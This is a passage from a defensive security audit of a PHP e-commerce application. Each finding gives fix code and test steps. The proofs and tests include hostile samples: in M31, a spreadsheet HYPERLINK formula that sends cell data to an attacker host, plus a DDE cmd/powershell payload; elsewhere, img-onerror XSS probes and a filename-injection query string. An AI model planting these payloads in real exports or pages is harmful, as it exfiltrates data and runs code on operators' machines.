**Fix:** Make `StatusMachine` the single owner it already claims to be. Replace `DELIVERY` with the reconciled union (dropping the phantom `'reassigned'`), then in `DeliveryRepository::updateStatus()` replace the `in_array($to, self::FLOW[$from] ?? [], true)` branch with `! StatusMachine::canDelivery($from, $to)` (`allowed()` already treats `$from === $to` as an idempotent no-op, so the explicit guard is redundant), add the import, and delete `const FLOW` — `grep` confirms no external readers.
**Regression Risk:** Medium — the reconciled map is the **union**, so nothing that works today stops working; it only makes moves one path already permitted available on the other. Three become newly legal for admins and two for riders. **If any of those five is genuinely meant to be forbidden, this legalises it** — confirm intent with operations rather than assuming the union is right. `StatusMachineTest` assertions (`canDelivery('delivered','assigned')` false, `canDelivery('failed','assigned')` true) both keep passing.
**Testing:** *Works:* `composer test -- --filter StatusMachineTest`; rider app drives pending → assigned → picked_up → out_for_delivery → delivered with POD, timeline mirroring each step; admin moves assigned → picked_up → out_for_delivery. *Closed:* mark a delivery failed via the rider app, then from `admin/deliveries/{n}` POST `status=assigned` → "Delivery moved to assigned", not the refusal. Confirm `DeliveryRepository` no longer declares `FLOW` and both paths still reject delivered → assigned.

---

#### M28 — `vendor/` is served straight off disk, exposing the full dependency manifest; dev dependencies are deployed
**Severity:** Medium
**Location:** `.htaccess:1-5` (rewrite) and `:17-24` (deny list); `vendor/` has no `.htaccess`.
**Description:** The DocumentRoot is the project root, and the rewrite to `public/index.php` only fires when the path does **not** exist (`RewriteCond %{REQUEST_FILENAME} !-f`). Anything real is served by Apache directly. The file has clearly been hardened — a loose-root-file deny, a dotfile deny, a data/backup-extension deny, and directory-level `Require all denied` in app/, system/, tests/, writable/, database/, build/, pma/ and s3_storage/, each commented. **`vendor/` was missed**, is in no `FilesMatch`, and `.json`/`.php`/`.md` are not in the extension deny. So `GET /vendor/composer/installed.json` returns, anonymously, the exact pinned version of all 24 production and 55 dev packages — the precise input for a CVE match with no probing. `Options -Indexes` does not help: Composer's layout is public knowledge. Compounding it, `composer install --no-dev` was not used — phpunit, php-cs-fixer, faker, kint, vfsstream, nexusphp, react and the sebastian suite are on the box, and `vendor/bin/` holds `phpunit`, `php-cs-fixer`, `php-parse`. Kint is dormant (loaded only when `CI_DEBUG` is true, and production sets it false) but should not be there.
*Stated precisely:* no vendor source was read (out of scope) and no claim is made that a specific file under `vendor/` is a working entry point. What is certain is that every byte is retrievable over HTTP.
**Fix:** Add `vendor/.htaccess` matching the existing directory-deny files byte-for-byte in style:
```apache
# Deny all web access.
#
# The project-root .htaccess serves any path that exists on disk directly
# (RewriteCond %{REQUEST_FILENAME} !-f), so every file under vendor/ was retrievable —
# including vendor/composer/installed.json, the exact pinned version of every
# dependency. Composer's layout is public knowledge, so Options -Indexes does not help.
#
# Nothing here is ever requested by a browser. The autoloader reads these files from
# PHP, which is filesystem access, not HTTP.
<IfModule authz_core_module>
	Require all denied
</IfModule>
<IfModule !authz_core_module>
	Deny from all
</IfModule>
```
Then, as a separate step, redeploy with `composer install --no-dev --optimize-autoloader`.
**Regression Risk:** Low — the deny affects HTTP only; the autoloader, `spark`, cron and every `require` read through the filesystem, exactly as for app/ and system/. **Confirm the unrelated `assets/vendor/` path (bootstrap, bootstrap-icons, jquery) is not caught** — it is a different directory and must stay readable. The `--no-dev` reinstall is the riskier half: run `composer test` before, and confirm no production request path touches dev tooling (it does not; `tests/` is itself web-denied).
**Testing:** *Works:* storefront, admin, vendor and an `api/v1` endpoint all load; render an invoice PDF (dompdf) and run an XLSX import (box/spout); `php spark facets:refresh` and `php spark tasks:run` from CLI. *Closed:* `curl -o /dev/null -w '%{http_code}' https://shiplore.in/vendor/composer/installed.json` → 403, likewise `/vendor/autoload.php` and `/vendor/bin/phpunit`; and `https://shiplore.in/assets/vendor/bootstrap/css/bootstrap.min.css` still returns 200.

---

#### M29 — `box/spout` is abandoned (last release 2021) and three production dependencies are pinned `"*"`
**Severity:** Medium
**Location:** `composer.json:18-20`; `composer.lock` (box/spout v3.3.0, `"abandoned": true`); `app/Libraries/Import/ImportService.php:7`, `app/Libraries/Import/ImportTemplateService.php:7`.
**Description:** `"box/spout": "*"`, `"dompdf/dompdf": "*"`, `"aws/aws-sdk-php": "*"` — everything else in the file is properly ranged. With `*`, any `composer update` can pull a new **major** version of the PDF renderer, the S3 client or the spreadsheet reader with no signal, breaking invoice generation, document storage or catalogue import at deploy time. And `box/spout` is flagged abandoned in the lock: released 2021-05-14, declared platform constraint `"php": ">=7.2.0"` (open-ended, so Composer installs it on 8.5 without it ever having been tested there), no security maintenance since. It is not dormant — it parses **admin-supplied XLSX** (ZIP+XML) on `POST admin/imports/upload`.
*Stated precisely:* no CVE database was reachable in this pass and `vendor/box/spout` source was not read. **No specific CVE is claimed.** What is verified is the abandoned flag, the release date, the open-ended platform constraint, and that it parses untrusted file input on a live route.
**Fix:** Two independent changes. (1) **Free, do now:** replace the wildcards with caret ranges anchored to what is already locked — `"^3.3"`, `"^3.1"`, `"^3.384"`. Pure metadata; `composer.lock` is untouched, so installed bytes do not move. (2) **Needs sign-off** (the brief forbids new dependencies; this is a swap, not an addition): migrate to `openspout/openspout ^4.23`, changing the two `use Box\Spout\…` lines to `use OpenSpout\…`. If (2) is deferred, at minimum reject uploads whose extension is not csv/xlsx before handing the file to Spout.
**Regression Risk:** (1) Low — `composer validate` confirms the lock still matches. (2) **Medium** — openspout 4.x renamed some entity/style classes; read both Import classes end to end, not just the `use` lines. The importer is the ingest path for bulk catalogue data, so a silent behaviour change (date coercion, empty-row handling, sheet order) would corrupt product records rather than error loudly.
**Testing:** *(1) Works:* `composer validate` and `composer install` report nothing to change; render an invoice PDF and upload an S3-backed KYC document. *(2) Works:* download each template, fill it, upload it, and diff the resulting `import_jobs` rows and created products against a pre-swap run — row counts, column mapping and error rows must match exactly. Repeat with a CSV and an XLSX containing an empty row, a merged header and a UTF-8 title. *Closed:* `composer show -a` reports no abandoned production package; no production requirement is `*`.

---

#### M30 — `SettingsRepository::get()` has no per-request memo — 6-11 identical SELECTs per page, several from inside views
**Severity:** Medium
**Location:** `app/Models/SettingsRepository.php:94-112`.
**Description:** `get()` is the read path for every scalar setting and hits the database on every call with no caching. The same class already knows better — `deliveryMaxRadiusKm()` (`:41-60`) keeps a `?float $maxRadiusMemo` precisely because "deliverability loops call this per variant". `get()`, which backs `brandName()`, `logoUrl()` and `moduleEnabled()`, got no such treatment, and those three are called 38 times across 20 files — many in **views and partials that render on every request**: `layouts/store.php` ×2, `partials/_store_header.php` ×2, `_store_footer.php` ×2, `layouts/rider.php` ×4, `_sidebar.php` ×3, `_head.php` ×2, `monline/_layout.php` ×3. The service is shared, so the object is reused — but it caches nothing, so every call is a separate round trip for the identical row. One storefront render performs ~6 identical `SELECT value FROM settings WHERE namespace='system' AND key='brand_name'` plus the same again for the logo, on the highest-traffic public surface.
*Checked and NOT a vulnerability:* the `key` comparison is interpolated raw with escaping disabled, but both arguments pass through `norm()` (`:158`, `preg_replace('/[^a-z0-9_.]/i','',$s)`), which strips quotes and every SQL metacharacter. Injection is closed. Flagged only because raw interpolation guarded by a sanitiser two methods away is fragile to future edits.
**Fix:** Give `get()` the memo the class already uses, keyed `namespace|key` so a miss is cached too, with the `catch` branch deliberately **not** memoised (a transient DB fault must not pin a default for the rest of the request). Invalidate in `set()` with `unset($this->memo[$namespace . '|' . $key]);`, hoisting the two `norm()` calls it already makes.
**Regression Risk:** Low — scope is one PHP request; the memo dies with it, so no cross-request or cross-tenant staleness is possible and no cache backend is involved. The explicit `unset()` covers a request that both writes and reads the same key, and the admin save flows redirect anyway. Storing `null` for a missing row and falling back to the caller's `$default` preserves today's semantics where two callers pass different defaults for the same absent key.
**Testing:** *Works:* storefront, admin, rider and monline all render the same brand name and logo; change the brand name at `admin/settings` and confirm the new name appears on the next page load; module toggles still reflect saved values. *Closed:* with the debug toolbar or query logging, count `FROM settings` queries on a storefront render — at most one per distinct namespace|key instead of six.

---

#### M31 — CSV formula injection in the admin product and order exports
**Severity:** Medium
**Location:** `app/Controllers/Admin/ProductController.php:84`; `app/Controllers/Admin/OrderController.php:49`.
**Description:** Both exports write untrusted free text straight into a CSV with `fputcsv()` and serve it as an attachment. `fputcsv()` quotes correctly for CSV, but a spreadsheet evaluates any cell whose text begins with `=`, `+`, `-`, `@`, TAB or CR as a formula — the quotes are consumed by the CSV parser before the value is interpreted. The injected columns are supplied by **lower-privileged parties** and consumed by the **highest-privileged** one: `$r['title']`/`$r['vendor']` (vendor-controlled — `VendorApiController::createProduct` only trims the title) and `$r['customer']`/`$r['customer_email']` (customer-controlled — `updateProfile` only trims the name). This is the one place vendor/customer text crosses out of the browser sandbox onto an operator's machine.
**Proof:** a vendor renames a product to `=HYPERLINK("https://attacker/?x="&C2&D2,"Open pricing")`. An admin exports and clicks the innocuous link — neighbouring cells exfiltrated. With `=cmd|'/c powershell …'!A0` and DDE enabled, code execution on the admin workstation.
**Fix:** One private helper per controller (matching the project's style of small private controller helpers) plus an `array_map`:
```php
/** Neutralise spreadsheet formula injection: Excel/Calc/Sheets evaluate any cell whose
 *  text starts with = + - @ TAB or CR. fputcsv() quoting does not stop that. A leading
 *  ' is the standard text marker and is not displayed by the reader. */
private static function csvCell(mixed $v): string
{
    $s = (string) $v;
    return $s !== '' && str_contains("=+-@\t\r", $s[0]) ? "'" . $s : $s;
}
// …fputcsv($out, array_map([self::class, 'csvCell'], [ …existing columns… ]));
```
`Admin\ReportController::exportSales` and `Vendor\PosController::exportReport` emit only numbers, dates and order numbers and need no change; `SimpleXlsx` shared strings are never evaluated as formulas.
**Regression Risk:** Low — only cells already beginning with those characters gain an apostrophe. Ids, prices and totals never start with them here (a negative price would, and would then import as text — exclude such a column if one ever appears). No importer reads these two files.
**Testing:** *Works:* both exports with and without filters open in Excel with the same columns and row count, prices still numeric and summable. *Closed:* set a product title to `=1+1` and a customer name to `=cmd|'/c calc'!A0`, re-export — both display as literal text, no formula, no DDE prompt.

---

#### M32 — `ajax-forms.js` reads escaped flash text back out of the DOM and hands it to SweetAlert2's HTML `title`
**Severity:** Medium
**Location:** `public/assets/js/ajax-forms.js:86` (`notify`) and `:138-151` (`upgradeServerAlerts`); paired with `App\Filters\AjaxRedirectFilter::after()` (`:85`).
**Description:** Layouts render flash messages through `esc()`. `upgradeServerAlerts()` then finds those nodes, takes `el.textContent` — which **decodes** the entities `esc()` just produced — deletes the node, and passes the decoded string to `notify()`, which renders it as SweetAlert2's `title`. Verified in the bundled library: `…e.title&&Ct(e.title,n),e.titleText&&(n.innerText=e.titleText)` — `title` goes through the HTML parser (`Ct`), only `titleText` uses `innerText`. Line 83 already does the right thing for errors (`text: message`), so the exposure is the toast path. The AJAX path is worse: `AjaxRedirectFilter::after()` puts the raw flash string into `payload['message']` and lines 240/261/270 pass it to `notify()` with **no escaping at all**.

This is a systemic bypass — it neutralises the `esc()` on **every** `.alert-success`/`.alert-danger` in the app, present and future. Today the reachable payloads are self-inflicted (the injector is the viewer), which is why it is Medium — but the injectable messages already exist: `Monline\CatalogController.php:102` (`'Sorting products near ' . $label . '.'` from raw POST), `ProductMediaActions.php:107,117` (raw uploaded filename), `Vendor\DeliveryController.php:100` (`'Marked failed: ' . $reason`). The moment any flash carries another party's data it becomes cross-user stored XSS with no further code change.
**Fix:** One line — use the text-only option the bundled build supports, which renders in the identical `.swal2-title` element:
```js
// `title` is an HTML sink in SweetAlert2; `titleText` sets innerText and renders in the
// same element. Flash text reaches here already decoded (upgradeServerAlerts reads
// textContent), so it must not be re-parsed.
toast().fire({ icon: icon, titleText: message });
```
**Regression Risk:** Low — a flash deliberately embedding markup would now show tags literally; a grep of every `with('success'|'error'|'warning'|'info', …)` in `app/Controllers` found only plain prose, so no current message changes appearance. Toast element, icon, timer and position unaffected.
**Testing:** *Works:* toggle a feature flag (AJAX path) and hard-reload after a redirect (the `upgradeServerAlerts` path) — the green toast appears top-right with the same text, icon and 2.8s timer; an invalid login still shows the red modal. *Closed:* POST `label=<img src=x onerror=alert(1)>` to `monline/location` — the toast displays the literal text and no alert fires. Same with an upload named `<img src=x onerror=alert(1)>.png`.

---

#### M33 — DOM XSS in the product image uploader: raw error strings (attacker-chosen filename) concatenated into `innerHTML`
**Severity:** Medium
**Location:** `public/assets/js/product-form.js:356`; fed by `App\Controllers\Concerns\ProductMediaActions::uploadImages()` (`:107,117,121`).
**Description:** `uploadImages()` builds `errors[]` entries beginning with the uploaded file's own name (`$file->getName()`, which is the **client-supplied** filename — `getRandomName()`/`store()` do the sanitising, not this) and returns them as JSON. `product-form.js` then does `upMsg.innerHTML = '<span class="text-danger">' + res.errors.join('; ') + '</span>'`. A multipart part with `filename="<img src=x onerror=…>.txt"` reaches the browser verbatim. Self-inflicted today (uploader is the viewer, endpoint is CSRF-protected), which caps severity — but it is a second, independent instance of the same class as M32, and the same payload could later surface in an admin review screen.
**Fix:** Fix the sink, so it holds for every message the endpoint can produce:
```js
else {
    // res.errors[] embeds the client-supplied filename; never concatenate it into innerHTML.
    upMsg.textContent = '';
    var errSpan = document.createElement('span');
    errSpan.className = 'text-danger';
    errSpan.textContent = (res && res.errors && res.errors.join('; ')) || 'Upload failed.';
    upMsg.appendChild(errSpan);
}
```
Optionally also cap the echoed name server-side: `mb_substr((string) ($file->getName() ?: 'image'), 0, 120)`.
**Regression Risk:** Low — identical rendered result (`<span class="text-danger">…</span>`, same text, same Bootstrap class); only the construction path changes. The neighbouring success/spinner branches use developer-authored literal markup and are untouched.
**Testing:** *Works:* upload `notes.txt` — the red rejection message appears in the same place with the same styling; a valid image still succeeds with its thumbnail. *Closed:* upload a rejected file named `<img src=x onerror=alert(1)>.gif` — the literal filename displays as text, no alert, and no `<img>` element exists in the DOM.

---

### LOW

---

#### L1 — monline: a branch manager can receive a purchase order destined for a sibling shop
**Severity:** Low
**Location:** `app/Controllers/Monline/OrderController.php:224` (`show`), `:243` (`receive`), and `cancel`.
**Description:** `place()` rejects a destination outside `buyerShopIds()` with an explicit comment that a manager must not route stock into a sibling branch, and `orders()` filters the list the same way. `show()`, `receive()` and `cancel()` pass only `buyerVendorId()`, so `PurchaseOrderRepository::findFor()` matches on `buyer_vendor_id` alone. `receive()` has the side effect: it credits stock at `$po['buyer_shop_id']` for every line, so a shop-3 manager confirms goods into shop 1, overstating a branch's inventory with nobody there having signed for it, and closing the PO so the real destination cannot confirm it. One tenant, already-trusted actor — hence Low — but it is the same rule `place()` enforces, applied inconsistently in the same controller.
**Fix:** Add `requirePoShopAccess(array $po)` that short-circuits `null` for owners (`vendor_staff_id === null`, matching how `buyerShopIds()` already distinguishes them) and otherwise requires `buyer_shop_id ∈ buyerShopIds()`. Resolve the PO first in `receive()`/`cancel()` (`show()` already has it) and call the guard.
**Regression Risk:** Low — owners unaffected; staff keep every PO destined for their own shops, exactly the set `/monline/orders` already shows, so no visible link goes dead. One extra `findFor()` in `receive()` (avoidable by having the repository accept an optional `?array $allowedShopIds`).
**Testing:** *Works:* owner and shop-1 manager both drive a PO to shop 1 through place → accept → dispatch → receive; `/monline/orders` lists it. *Closed:* as a shop-3-only manager, GET/receive/cancel a shop-1 PO — all three redirect with "Purchase order not found."; status still 'dispatched' and shop 1's `inventory_levels` unchanged.

---

#### L2 — Vendor staff API writes `staff_type` straight from the request body into an ENUM column
**Severity:** Low
**Location:** `app/Controllers/Api/V1/VendorApiController.php:1498`, `:1519`, `:1553-1555`; schema `database/sql/10_staff.sql:28`.
**Description:** `$type = $body['type'] ?? 'cashier'` is inserted with no membership check, despite the inline comment naming the expected values. Under strict mode an out-of-range value raises `Data truncated`, propagating as an unhandled `DatabaseException` — a 500 with a framework envelope instead of the project's `VALIDATION_ERROR` 422 — **after** the `users` insert has already run with no transaction, leaving an orphaned row the next call silently reuses. Under a non-strict session it stores `''`, which no `staff_type` filter will ever match. Every neighbouring enum in this controller *is* validated (`createProduct` status, `addPaymentInstrument` type), so these two are the gap.
**Fix:** `private const STAFF_TYPES = ['branch_manager','cashier','packer','helper','delivery_boy','manager','other'];` mirroring the column, then `in_array(...)` with a `'cashier'` fallback on create (preserving today's tolerant behaviour) and a 422 `VALIDATION_ERROR` on update.
**Regression Risk:** Low — all seven ENUM values still work. A client sending an out-of-range value gets 422 instead of 500 on the update path; check the app's staff-type picker values before shipping that half.
**Testing:** *Works:* POST with each of the seven values → 200 and the row matches; PUT with `branch_manager` still updates and the app's staff list renders. *Closed:* POST `"type":"owner"` creates the row as `cashier` (no 500); PUT `"type":"owner"` returns 422 and leaves the row unchanged.

---

#### L3 — Unvalidated GET dates interpolated into the `Content-Disposition` filename of the POS report export
**Severity:** Low
**Location:** `app/Controllers/Vendor/PosController.php:232-245`.
**Description:** `$from`/`$to` come straight from the query string with no format check and are concatenated into a quoted header parameter. A `"` closes the quoted string early, letting the caller append further parameters and choose the downloaded file's name and extension. **Header splitting is not possible** (PHP's `header()` rejects CR/LF) and the SQL side is safe (`PosReportRepository` binds both dates), so the impact is limited to controlling the saved filename of a file the caller downloads for themselves — hence Low. The admin equivalent gets this right (`Admin\ReportController::period()` validates with `preg_match('/^\d{4}-\d{2}-\d{2}$/', …)` before the same header pattern).
**Fix:** Copy that guard verbatim:
```php
// Same guard as Admin\ReportController::period(): these values are echoed into the
// Content-Disposition filename, so only a literal Y-m-d may pass.
if (! preg_match('/^\d{4}-\d{2}-\d{2}$/', $from)) { $from = date('Y-m-d', strtotime('-29 days')); }
if (! preg_match('/^\d{4}-\d{2}-\d{2}$/', $to))   { $to   = date('Y-m-d'); }
```
**Regression Risk:** Low — the UI submits date inputs, which always produce `YYYY-MM-DD`. A caller passing a looser string (`2026-1-5`) now falls back to the default instead of reaching MySQL; check whether any bookmark or the vendor app builds the URL by hand.
**Testing:** *Works:* pick a custom range and export — the CSV matches the on-screen report and is named `pos-sales-<from>_<to>.csv`. *Closed:* `?from=x";filename="evil.html&to=2026-01-01` yields a single well-formed `filename=` with no second parameter.

---

#### L4 — Admin banners page: `json_encode()` into an HTML attribute and into `<script>` without `JSON_HEX_APOS`/`JSON_HEX_TAG`
**Severity:** Low
**Location:** `app/Views/admin/banners/index.php:76`, `:270`, `:271`.
**Description:** Line 76 puts a whole banner row inside a **single-quoted** attribute (`onclick='openEdit(<?= json_encode($b) ?>)'`); `json_encode()` does not escape `'` without `JSON_HEX_APOS`, so an apostrophe in a title/subtitle/target_url terminates the attribute and everything after is re-tokenised as further attributes on the `<button>` — an HTML-injection primitive. Lines 270-271 put category and brand lists into an inline `<script>` without `JSON_HEX_TAG`, so a name containing `</script>` closes the block. All three inputs are created inside the admin panel, so the injector already holds admin write permission — admin-to-admin, not escalation, hence Low. Worth fixing because the correct pattern is one file away (`partials/_product_form_body.php:328`) and the fix is two flags. The rest of the same file escapes correctly (`esc($b['title'],'js')`, `esc($b['image_url'],'attr')`), so these three are outliers.
**Fix:** `json_encode($b, JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_TAG | JSON_HEX_AMP)` on line 76; `json_encode(array_values($categories), JSON_HEX_TAG)` and the same for brands on 270-271.
**Regression Risk:** Low — `JSON_HEX_*` changes only the escape representation; `JSON.parse` and the JS literal parser decode identically, so `openEdit()`, the Select2 category picker and the brand cascade receive the same objects.
**Testing:** *Works:* Edit prefills title, subtitle, target URL, sort order and status; the category Select2 and brand cascade populate; save updates the row. *Closed:* create a banner titled `it's "quoted" <b>x</b>` and a brand named `A</script>B` — view source shows one well-formed `onclick='…'`, the `<script>` closes only at its own tag, and Edit still prefills the exact title.

---

#### L5 — Malformed `data-confirm` attribute in the generic master-data list truncates the confirmation prompt
**Severity:** Low
**Location:** `app/Views/admin/master/index.php:25`.
**Description:** The attribute is opened with `"`, then a second `"` before the interpolated record name and a third after it, intending nested quotes. HTML has no nesting there — the value ends at the second `"`, and the escaped name plus trailing `?"` become stray attributes on the `<form>`. So the confirm dialog says only `"Deactivate "` with no record name, on a shared page used for every master list. **Checked and not exploitable:** `esc($v, 'attr')` is CI4's `escapeHtmlAttr`, which hex-encodes every non-alphanumeric character including space, `=`, `"` and `'`, so in the bare attribute-name position the value cannot regain a space or `=` and no event handler can form. Reported because it is a real correctness defect in an **admin safety prompt** — an operator confirming a toggle without being told which record, on `admin/units` or `admin/tax-classes`, immediately affects product forms and GST computation.
**Fix:** Build the whole value in one PHP expression and escape once (as the rest of the file already does):
```php
<?php
$confirmName = (string) ($r[($spec['columns'][0][0] ?? 'name')] ?? '');
$confirmMsg  = ($isActive ? 'Deactivate' : 'Activate') . ' "' . $confirmName . '"?';
?>
… data-confirm="<?= esc($confirmMsg, 'attr') ?>">
```
**Regression Risk:** Low — purely presentational; same form, action, CSRF field, `data-ajax-refresh` and button. `confirmDialog()` passes it through SweetAlert2's `text:` option, which is already text-only.
**Testing:** *Works:* on `admin/units` and one other slug, the confirm appears, Cancel aborts, Yes toggles and refreshes in place. *Closed:* the dialog reads `Deactivate "Kilogram"?`; view source shows no stray tokens after `data-confirm`; a record named `A" onmouseover=x` renders literally with no extra attributes.

---

#### L6 — Private vendor KYC images are offered in the product-image library picker
**Severity:** Low
**Location:** `app/Models/MediaRepository.php:46-57` (`vendorImages`).
**Description:** The picker query filters on `status`, `deleted_at` and `mime LIKE 'image/%'` but **not** `visibility`. A KYC document uploaded as JPG or PNG has `owner_type='vendor'`, `owner_id={vendorId}`, `visibility='private'` — matching every predicate — so it appears alongside genuine product photography. Selecting it attaches it (`vendorOwnsImage()` also ignores visibility) and the image is rendered on the **public** product page as `site_url('media/'.$uuid)`. Two consequences: the UUID is published in anonymously-readable HTML, and combined with M1 that UUID becomes a working handle on the vendor's PAN/GST/bank scan for every logged-in customer. To an anonymous visitor the image simply fails to load, so the vendor gets no visual signal. Low because the exposed document belongs to the vendor doing the exposing — a foot-gun, not a cross-tenant break — but the UI actively invites the mistake.
**Fix:** Add `->where('visibility', 'public')` to `vendorImages()`. **Deliberately change only the listing, not `vendorOwnsImage()`** — so any private image already attached to a live product keeps rendering and no existing page changes. Then audit:
```sql
SELECT pm.product_id, ma.id, ma.uuid, ma.owner_type, ma.owner_id
  FROM product_media pm JOIN media_assets ma ON ma.id = pm.media_id
 WHERE ma.visibility = 'private' AND ma.deleted_at IS NULL;
```
Any row is a vendor document currently on a product page — detach it through the normal "remove image" action.
**Regression Risk:** Low — product images and vendor logos are all stored `public`, so the picker's normal contents are unchanged. The one visible difference: a previously-attached private image still displays but can no longer be re-selected after detaching. Confirm via the audit query that no tenant is knowingly using a private asset as product art.
**Testing:** *Works:* upload two product images, open "choose from library" — both listed, attachable, and rendered on the storefront; same via the admin product editor and the JSON endpoint. *Closed:* upload a JPG through Documents (KYC) and reopen the picker — it must not appear, while the underlying count query shows a non-zero number of such rows. Audit query returns zero attached private assets.

---

#### L7 — Login lockout counts fail open on a DB error, silently, and there is no accumulation across identifiers
**Severity:** Low
**Location:** `app/Models/LoginAttemptRepository.php:20-33` (`recentFailureCount`), used by `Auth\LoginController.php:80-83`; `app/Filters/ThrottleFilter.php:28`.
**Description:** `recentFailureCount()` swallows every `Throwable` and returns 0, which the controller reads as "no recent failures" — so any condition that makes the query fail (missing table, connection exhaustion, lock timeout under load) **silently removes brute-force protection from the web login entirely**, with nothing logged. The availability argument for failing open is sound; the problem is that the degraded state is invisible — there is no signal distinguishing "no failures" from "the lockout is not running", and the only clue is that the table stopped growing, which nobody watches. Separately the lockout keys only on the exact identifier, so **password spraying** (one guess each against many accounts) never trips it; the only remaining brake is `throttle:10,60`, keyed per source IP.
**Fix:** Keep failing open — make it audible:
```php
} catch (Throwable $e) {
    // Fail open: never lock real users out because of a DB error. Log it, though —
    // a silent 0 here disables brute-force protection with no other signal.
    log_message('critical', 'Login lockout check unavailable (brute-force protection degraded): ' . $e->getMessage());
    return 0;
}
```
Same treatment for `record()` at `:47` (`log_message('error', 'Login attempt audit failed: …')`). The spraying gap is a throttle-tuning decision (`Routes.php:33`), not a defect in this method.
**Regression Risk:** Low — purely additive; return value, control flow and the fail-open contract unchanged. `critical` is inside the production threshold so the line is actually written; noise while the DB is failing is the point.
**Testing:** *Works:* 5 failures then a refusal; wait out the window and login succeeds. *Closed:* on staging, rename `login_attempts`, attempt a login — login still functions (no 500) **and** a `critical` line naming the degraded lockout appears. Restore and confirm it stops.

---

#### L8 — Audit log filter uses a leading-wildcard LIKE on an append-only, ever-growing table
**Severity:** Low
**Location:** `app/Models/AuditLogRepository.php:27`; index `database/sql/08_audit.sql:39`.
**Description:** `like()` defaults to match position `'both'`, generating `WHERE a.action LIKE '%value%'`, which makes `idx_audit_action` unusable. For a common prefix the backward `ORDER BY a.id DESC LIMIT 300` scan fills quickly, but for a rare or non-existent action it never fills and reads the **entire** table — one documented as never deleted ("rows are never updated or deleted"), so it grows for the life of the system. Admin-only and permission-gated, so an operational cliff rather than an attack — but it is precisely the query that gets slower forever and is used exactly when something has gone wrong.
**Fix:** `->like('a.action', $action, 'after')` — a prefix match `idx_audit_action` can serve as a range scan. Audit action codes are dotted prefixes (`order.`, `product.`, `monline.`), so prefix matching is the natural search.
**Regression Risk:** Low, but it **is** a semantic change: searching `login` would no longer match `auth.login`. Confirm with whoever uses the screen; if substring search is required, take the alternative of keeping `like()` and adding `->where('a.created_at >=', date('Y-m-d H:i:s', strtotime('-90 days')))` (served by `idx_audit_created`), and label the field accordingly in the UI.
**Testing:** *Works:* unfiltered list shows the same 300 newest entries; a full action code returns the same rows. *Closed:* `EXPLAIN … WHERE a.action LIKE 'product.%' …` shows `type=range` on `idx_audit_action`; a deliberately non-existent action returns immediately.

---

#### L9 — Refund status writes bypass `StatusMachine::canRefund()`, which exists, is unit-tested, and is called from nowhere
**Severity:** Low
**Location:** `app/Models/RefundRepository.php:65-70`; `app/Libraries/Workflow/StatusMachine.php:59-63`, `:127-130`; test at `tests/unit/Common/StatusMachineTest.php:44`.
**Description:** `canRefund()` and `canOrder()` are declared and covered by tests, and a grep of `app/` shows **zero** call sites for either (only `canDelivery()` is used, by `RiderRepository`). Meanwhile `updateStatus()` applies no rule at all, while the class docblock claims the opposite ("status transitions: a refund can be marked completed or failed. Fail-safe."). So a refund that `RefundService::complete()` has finalised — ledger posted, credit note numbered from the gapless per-shop series, commission hold cancelled — can be flipped back to 'failed'. `complete()` is idempotent on re-entry only while the status *is* 'completed'; once moved away, the refund can be processed a **second** time, posting a duplicate balanced triple of ledger entries and burning a second credit-note number. The trial balance still balances — which is what makes it hard to spot — but SALES and GST_PAYABLE are double-debited. Low because it needs `payment.refund` (a trusted finance role) and is a mis-click hazard, not an attack.
**Fix:** Enforce the rule that already exists — read the current status, `if (! StatusMachine::canRefund($row['status'], $status)) { return false; }`, then update. `Admin\RefundController::transition()` already handles a false return by flashing an error and redirecting.
**Regression Risk:** Low — `allowed()` returns true when `$from === $to`, so idempotent retries stay successful no-ops, and every transition finance actually uses (initiated → completed/failed, processing → failed) still works. What stops is completed → failed, which is the point. `RefundService::complete()` writes 'completed' through its own update and does not route here, so it is unaffected. **Check for a runbook that relies on flipping a completed refund back to correct a mistake** — that workflow needs an explicit audited reversal action, not an unguarded status write.
**Testing:** *Works:* mark an initiated refund failed → success; process another → credit note flash and a balanced txn_group. *Closed:* POST `/admin/refunds/{n}/fail` on the completed one → error flash, status still 'completed', no second `ledger_entries` set and no second `credit_notes` row. Run `StatusMachineTest`.

---

#### L10 — `GstCalculator` does float arithmetic on money in a codebase that ships an integer-backed `Money` class to prevent exactly that
**Severity:** Low
**Location:** `app/Libraries/Tax/GstCalculator.php:23-37`; contrast `app/Libraries/Money.php:10-13`, `:57-67`, `:106-113`. Second implementation at `app/Libraries/Purchase/PurchaseInvoiceService.php:141-161`.
**Description:** `Money` states its purpose ("integer-backed … Never uses float, so no drift. Half-up rounding") and warns that "casting to float reintroduces the representation error this class exists to avoid." `GstCalculator` — which computes the tax on every order line, POS sale, POS return and checkout — ignores it entirely: `$amt = (float) $amount`, then `$amt / (1 + $ratePct/100)` and `round(…, 2)` applied to values that already carry representation error. Dividing by 1.18 or 1.05 produces a non-terminating binary fraction for most rupee amounts, and it is the single least float-friendly operation in the model. The class does one thing right — `sgst = round($tax - $cgst, 2)`, so the CGST/SGST split never leaks — but the total it splits was computed in float. Per-line error is at most a paisa, so **Low**: no single line was found materially wrong. The real cost is aggregate — these values are SUMmed across thousands of sub-orders for the GST return, so the residue accumulates in whichever direction the rounding biases. `PurchaseInvoiceService::lineMath()` is a second, differently-rounded (3 dp, independent cgst/sgst) implementation of the same rule.
**Fix:** Do the inclusive division on integer units via `Money`, keeping the signature, the 2-decimal string output and the leak-free split so no caller changes. **The input guard is load-bearing:** callers pass `(string) $lineAfter` from float expressions, which can render as `"1.0E-5"`, and `Money::of()` throws on that — an exception inside `place()` would roll the whole order back. So add `private function norm(string $amount): string` returning `preg_match('/^[+-]?\d+(\.\d+)?$/', $a) ? $a : '0'` and route every input through it.
**Regression Risk:** Medium — this is tax arithmetic on the checkout path; treat it as a money change, not a refactor. Individual line values may move by up to one paisa, so new orders will not tie out to a spreadsheet built from old ones. **Do not also change `PurchaseInvoiceService` in the same commit** — its 3-dp rounding is deliberate ("matches WPF" per its docblock) and reconciling the two is a separate decision.
**Testing:** *Works:* full suite, then a store checkout, POS sale, POS return and credit note, each with an inclusive and an exclusive GST product, intra- and inter-state; for every row assert `taxable + cgst + sgst + igst == grand_total` exactly and `cgst + sgst == tax`. *Closed:* table-test ₹0.01 / ₹1.00 / ₹99.99 / ₹1000.00 / ₹123456.78 at 0/5/12/18/28, both modes; assert `taxable + tax == total` to the paisa, and that 10,000 identical ₹1000-at-18%-inclusive lines give exactly 10,000 × 152.54 with no residue. `admin/reports/gst` for a **closed historical period** must be identical (pre-existing rows unchanged).

---

#### L11 — Shared service definitions are declared but bypassed by direct `new`
**Severity:** Low
